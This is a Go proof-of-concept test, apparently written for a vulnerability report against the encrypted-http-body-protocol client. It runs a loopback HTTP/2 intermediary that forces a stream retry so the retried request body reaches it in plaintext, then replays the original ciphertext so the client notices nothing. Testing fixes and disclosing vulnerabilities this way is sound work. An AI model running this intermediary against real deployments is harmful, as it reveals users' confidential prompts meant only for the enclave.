package client

// Local PoC (loopback only). Dropped into client/ of an unmodified
// encrypted-http-body-protocol checkout (v0.3.2 or v0.4.0).
//
// The "intermediary" terminates TLS (it holds a certificate the client trusts,
// as Tinfoil's gateway or a configured proxy does) and speaks raw HTTP/2
// frames. It never holds the enclave's HPKE private key. It:
//   1. lets the sealed request stream arrive, then refuses it
//      (RST_STREAM REFUSED_STREAM) or sends GOAWAY(NO_ERROR);
//   2. records the body of the retried stream;
//   3. forwards the ORIGINAL ciphertext to the genuine enclave and relays
//      the sealed answer, so the client sees a normal, decrypted 200.
//
// POC_EXPECT=vulnerable (default): the test passes if the plaintext reached
// the intermediary and the client call succeeded.
// POC_EXPECT=fixed: the test passes if the plaintext never reached the
// intermediary (used with the one-line fix applied).

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"

	"github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	"github.com/tinfoilsh/encrypted-http-body-protocol/protocol"
)

const pocCanary = "CANARY-PROMPT acquisition target is ACME Corp"

type pocStream struct {
	hdr  map[string]string
	body bytes.Buffer
}

type pocIntermediary struct {
	enclaveURL string
	goaway     bool // trigger: GOAWAY(NO_ERROR) instead of RST_STREAM(REFUSED_STREAM)

	mu       sync.Mutex
	sealed   *pocStream // first attempt (ciphertext), shared across connections
	observed []string   // every request body the intermediary could read
}

func (m *pocIntermediary) serve(c net.Conn) {
	defer c.Close()
	preface := make([]byte, len(http2.ClientPreface))
	if _, err := io.ReadFull(c, preface); err != nil || string(preface) != http2.ClientPreface {
		return
	}
	fr := http2.NewFramer(c, c)
	fr.WriteSettings()
	dec := hpack.NewDecoder(4096, nil)
	streams := map[uint32]*pocStream{}
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return
		}
		var ended uint32
		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				fr.WriteSettingsAck()
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				fr.WritePing(true, f.Data)
			}
		case *http2.HeadersFrame:
			fields, err := dec.DecodeFull(f.HeaderBlockFragment())
			if err != nil {
				return
			}
			s := &pocStream{hdr: map[string]string{}}
			for _, hf := range fields {
				s.hdr[hf.Name] = hf.Value
			}
			streams[f.StreamID] = s
			if f.StreamEnded() {
				ended = f.StreamID
			}
		case *http2.DataFrame:
			s := streams[f.StreamID]
			if s == nil {
				continue
			}
			s.body.Write(f.Data())
			if n := uint32(len(f.Data())); n > 0 {
				fr.WriteWindowUpdate(0, n)
				fr.WriteWindowUpdate(f.StreamID, n)
			}
			if f.StreamEnded() {
				ended = f.StreamID
			}
		}
		if ended == 0 {
			continue
		}
		s := streams[ended]
		m.mu.Lock()
		m.observed = append(m.observed, s.body.String())
		first := m.sealed == nil
		if first {
			m.sealed = s
		}
		sealed := m.sealed
		m.mu.Unlock()

		if first {
			if m.goaway {
				// Graceful shutdown: last processed stream 0, so the client
				// treats this stream as unprocessed and retries it.
				fr.WriteGoAway(0, http2.ErrCodeNo, nil)
			} else {
				fr.WriteRSTStream(ended, http2.ErrCodeRefusedStream)
			}
			continue
		}

		// The retry arrived. Forward the ORIGINAL ciphertext to the genuine
		// enclave and relay its sealed answer.
		up, _ := http.NewRequest(http.MethodPost, m.enclaveURL+s.hdr[":path"], bytes.NewReader(sealed.body.Bytes()))
		up.Header.Set(protocol.EncapsulatedKeyHeader, sealed.hdr[strings.ToLower(protocol.EncapsulatedKeyHeader)])
		resp, err := http.DefaultClient.Do(up)
		if err != nil {
			return
		}
		reply, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		var hb bytes.Buffer
		enc := hpack.NewEncoder(&hb)
		enc.WriteField(hpack.HeaderField{Name: ":status", Value: fmt.Sprint(resp.StatusCode)})
		enc.WriteField(hpack.HeaderField{Name: strings.ToLower(protocol.ResponseNonceHeader), Value: resp.Header.Get(protocol.ResponseNonceHeader)})
		fr.WriteHeaders(http2.HeadersFrameParam{StreamID: ended, BlockFragment: hb.Bytes(), EndHeaders: true})
		fr.WriteData(ended, true, reply)
	}
}

func pocCertificate(t *testing.T) (tls.Certificate, *x509.CertPool) {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "intermediary"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		KeyUsage:     x509.KeyUsageDigitalSignature,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	leaf, _ := x509.ParseCertificate(der)
	pool := x509.NewCertPool()
	pool.AddCert(leaf)
	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key, Leaf: leaf}, pool
}

func TestPoC_H2RetryPlaintext(t *testing.T) {
	expect := os.Getenv("POC_EXPECT")
	if expect == "" {
		expect = "vulnerable"
	}
	for _, trig := range []struct {
		name   string
		goaway bool
	}{{"REFUSED_STREAM", false}, {"GOAWAY_NO_ERROR", true}} {
		t.Run(trig.name, func(t *testing.T) {
			// Genuine enclave: the only holder of the HPKE private key.
			enclaveID, err := identity.NewIdentity()
			if err != nil {
				t.Fatal(err)
			}
			enclave := httptest.NewServer(enclaveID.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				io.ReadAll(r.Body)
				io.WriteString(w, "genuine enclave answer")
			})))
			defer enclave.Close()

			cert, pool := pocCertificate(t)
			ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{cert}, NextProtos: []string{"h2"}})
			if err != nil {
				t.Fatal(err)
			}
			defer ln.Close()
			mitm := &pocIntermediary{enclaveURL: enclave.URL, goaway: trig.goaway}
			go func() {
				for {
					c, err := ln.Accept()
					if err != nil {
						return
					}
					go mitm.serve(c)
				}
			}()

			// Client: knows the enclave's HPKE public key (what attestation
			// yields). Inner transport = http.DefaultTransport clone whose only
			// change is trusting the intermediary's certificate.
			inner := http.DefaultTransport.(*http.Transport).Clone()
			inner.TLSClientConfig = &tls.Config{RootCAs: pool}
			serverIdentity, err := identity.FromPublicKeyHex(enclaveID.MarshalPublicKeyHex())
			if err != nil {
				t.Fatal(err)
			}
			tr, err := NewTransportWithIdentity(serverIdentity, WithHTTPClient(&http.Client{Transport: inner}))
			if err != nil {
				t.Fatal(err)
			}

			body := `{"model":"m","messages":[{"role":"user","content":"` + pocCanary + `"}]}`
			resp, err := (&http.Client{Transport: tr, Timeout: 10 * time.Second}).Post(
				"https://"+ln.Addr().String()+"/v1/chat/completions", "application/json", strings.NewReader(body))
			var answer []byte
			if err != nil {
				t.Logf("client: error: %v", err)
			} else {
				answer, _ = io.ReadAll(resp.Body)
				resp.Body.Close()
				t.Logf("client: status=%d proto=%s decrypted answer=%q", resp.StatusCode, resp.Proto, answer)
			}

			mitm.mu.Lock()
			defer mitm.mu.Unlock()
			leaked := false
			for i, b := range mitm.observed {
				shown := b
				if len(shown) > 100 {
					shown = shown[:100] + "..."
				}
				t.Logf("intermediary observed body #%d (%d bytes): %q", i, len(b), shown)
				if strings.Contains(b, pocCanary) {
					leaked = true
				}
			}

			switch expect {
			case "vulnerable":
				if !leaked || err != nil || string(answer) != "genuine enclave answer" {
					t.Fatalf("NOT REPRODUCED: leaked=%v err=%v answer=%q", leaked, err, answer)
				}
				t.Logf("VULNERABLE [%s]: intermediary read the plaintext body; client got the genuine decrypted answer", trig.name)
			case "fixed":
				if leaked {
					t.Fatalf("STILL VULNERABLE: plaintext reached the intermediary")
				}
				t.Logf("FIXED [%s]: no plaintext reached the intermediary (client error: %v)", trig.name, err)
			}
		})
	}
}
